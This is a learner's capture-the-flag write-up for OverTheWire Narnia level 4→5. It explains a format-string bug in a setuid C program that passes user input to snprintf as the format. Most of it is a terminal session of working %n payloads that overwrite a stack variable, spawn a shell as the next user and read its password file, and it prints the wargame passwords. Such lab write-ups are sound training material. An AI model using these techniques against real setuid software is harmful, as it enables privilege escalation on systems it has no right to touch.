# Narnia Level 4 → Level 5 Buffer Overflow w/ Format String Vulnerability of printf and snprintf

## Previous Flag
<b>Ni3xHPEuuw</b>

## Goal
Use previous password to log in SSH with user <b>narnia5</b> and port <b>2226</b> accessed on narnia.labs.overthewire.org.

There is no information for this level, intentionally.

## What I learned
```
int sprintf(char *restrict str, const char *restrict format, ...);
int snprintf(char str[restrict .size], size_t size, const char *restrict format, ...);
Proper: snprintf(buffer, sizeof(buffer), "%s"👀, argv[1])
Reference for format specifier for snprintf: https://www.programiz.com/cpp-programming/library-function/cstdio/snprintf
    Note: Other reference sites like Microsoft not explain the format specifier like above site
Format String Attack: https://owasp.org/www-community/attacks/Format_string_attack

printf sees %n:
    Take next argument (a pointer) from stack
    Write current number of bytes printed so far (4+400) into that pointer’s address
```

## Solution
```
PS C:\Users\trung.DESKTOP-G7C81CH\Downloads\01noobHacker> ssh narnia5@narnia.labs.overthewire.org -p 2226 ⌨️
narnia5@narnia:~$ cd /narnia/ ⌨️
narnia5@narnia:/narnia$ file narnia5 ⌨️
narnia5: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=42ca8c6f2c036f561bb7d00d67be82977c5a9019, for GNU/Linux 3.2.0, not stripped
narnia5@narnia:/narnia$ cat narnia5.c ⌨️
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){
        int i = 1;
        char buffer[64]; 👀 higher memory

        snprintf(buffer, sizeof buffer, argv[1]); 👀 Vulnerability Here
        buffer[sizeof (buffer) - 1] = 0;
        printf("Change i's value from 1 -> 500. ");

        if(i==500){
            printf("GOOD\n");
            setreuid(geteuid(),geteuid());
            system("/bin/sh");
        }

        printf("No way...let me give you a hint!\n");
        printf("buffer : [%s] (%d)\n", buffer, strlen(buffer));
        printf ("i = %d (%p)\n", i, &i);
        return 0;
}
narnia5@narnia:/narnia$ ./narnia5 ⌨️
Segmentation fault (core dumped)
narnia5@narnia:/narnia$ ./narnia5 AAA ⌨️
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [AAA] (3)
i = 1 (0xffffd3a0) 👀 Here hint, gives addy of i, always same depend on arg

# Try w/ python3 printf echo -e
narnia5@narnia:/narnia$ narnia5@narnia:/narnia$ ./narnia5 $(python3 -c "print('A'*3)") ⌨️
 No way...let me give you a hint!
buffer : [AAA] (3)
i = 1 (0xffffd3a0)-bash: narnia5@narnia:/narnia$: No such file or directory
narnia5@narnia:/narnia$ ./narnia5 "$(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*3)')" ⌨️❤️
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [AAA] (3)
i = 1 (0xffffd3a0)
narnia5@narnia:/narnia$ ./narnia5 "$(python3 -c 'import sys; sys.stdout.buffer.write(b"\x90\x90\x90" + b"\x41\x41\x41")')" ⌨️
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [AAA] (6)
i = 1 (0xffffd3a0)
narnia5@narnia:/narnia$ ./narnia5 `printf 'A%.0s' {1..3}` ⌨️❤️
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [AAA] (3)
i = 1 (0xffffd3a0)
narnia5@narnia:/narnia$ ./narnia5 "$(echo -e '\x41\x41\x41')" ⌨️
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [AAA] (3)
i = 1 (0xffffd3a0)
narnia5@narnia:/narnia$ ./narnia5 "$(echo -e 'AAA')" ⌨️
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [AAA] (3)
i = 1 (0xffffd3a0)

# Optional: ltrace 
narnia5@narnia:/narnia$ ltrace ./narnia5 `printf 'A%.0s' {1..3}` ⌨️
__libc_start_main(0x80490dd, 2, 0xffffd464, 0 <unfinished ...>
snprintf("AAA", 64👀, "AAA")                                                              = 3
printf("Change i's value from 1 -> 500. "...)                                              = 32
puts("No way...let me give you a hint!"...Change i's value from 1 -> 500. No way...let me give you a hint!
)                                                = 33
strlen("AAA")                                                                              = 3
printf("buffer : [%s] (%d)\n", "AAA", 3buffer : [AAA] (3)
)                                                   = 19
printf("i = %d (%p)\n", 1, 0xffffd3a0i = 1 (0xffffd3a0)
)                                                     = 19
+++ exited (status 0) +++
narnia5@narnia:/narnia$ ltrace ./narnia5 `printf 'A%.0s' {1..300}` ⌨️
__libc_start_main(0x80490dd, 2, 0xffffd334, 0 <unfinished ...>
snprintf("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 64👀, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...) = 300
printf("Change i's value from 1 -> 500. "...)                                              = 32
puts("No way...let me give you a hint!"...Change i's value from 1 -> 500. No way...let me give you a hint!
)                                                = 33
strlen("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...)                                              = 63
printf("buffer : [%s] (%d)\n", "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 63buffer : [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA] (63)
)                  = 80
printf("i = %d (%p)\n", 1, 0xffffd270i = 1 (0xffffd270)
)                                                     = 19
+++ exited (status 0) +++
narnia5@narnia:/narnia$ whatis snprintf ⌨️
snprintf (3)         - formatted output conversion
narnia5@narnia:/narnia$ man snprintf ⌨️

narnia5@narnia:/narnia$ ./narnia5 $(python3 -c "import sys;sys.stdout.buffer.write(b'\xe0\xd2\xff\xff' + b'A'*200 + b'%n')") ⌨️
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA] (63)
i = 204 (0xffffd2e0) 👀 i went up
narnia5@narnia:/narnia$ ./narnia5 $(python3 -c "import sys;sys.stdout.buffer.write(b'\x10\xd2\xff\xff' + b'A'*400 + b'%n')") ⌨️
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA] (63)
i = 404 (0xffffd210) 👀 Notice: adds +4 to A
narnia5@narnia:/narnia$ ./narnia5 $(python3 -c "import sys;sys.stdout.buffer.write(b'\xb0\xd1\xff\xff' + b'A'*496 + b'%n')") ⌨️
Change i's value from 1 -> 500. GOOD
$ whoami ⌨️
narnia6
$ cat /etc/narnia_pass/narnia6 ⌨️
BNSjoSDeGL 🔐

Method 2:
narnia5@narnia:/narnia$ ./narnia5 $(echo -e "\x41\x41\x41\x41") ⌨️
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [AAAA] (4)
i = 1 (0xffffd3a0)
narnia5@narnia:/narnia$ ./narnia5 $(echo -e "\xa0\xd3\xff\xff") ⌨️
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [] (4)
i = 1 (0xffffd3a0)
narnia5@narnia:/narnia$ ./narnia5 $(echo -e "\xa0\xd3\xff\xff")%n ⌨️
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [] (4)
i = 4 (0xffffd3a0)
narnia5@narnia:/narnia$ ./narnia5 $(echo -e "\xa0\xd3\xff\xff\x41\x41\x41\x41")%n ⌨️
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [AAAA] (8)
i = 8 (0xffffd3a0)

# Try with 20 spaces %20x but %n pointer not know where to count address from 1st(address) or 2nd argument (20 spaces)
narnia5@narnia:/narnia$ ./narnia5 $(echo -e "\xa0\xd3\xff\xff")%20x%n ⌨️
Segmentation fault (core dumped)

# 1\$ says use first argument for n
# Note: Must use \$ or thinks $ is subshell
narnia5@narnia:/narnia$ ./narnia5 $(echo -e "\xa0\xd3\xff\xff")%20x%1\$n ⌨️
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [            ffffd3a0] (24)
i = 24 (0xffffd3a0)
narnia5@narnia:/narnia$ ./narnia5 $(echo -e "\xa0\xd3\xff\xff")%496x%1\$n ⌨️
Change i's value from 1 -> 500. GOOD
$ whoami ⌨️
narnia6
$ cat /etc/narnia_pass/narnia6 ⌨️ 
BNSjoSDeGL 🔐
```

## Flag
<b>BNSjoSDeGL</b>

## Continue
[Continue](./Narnia0506.md)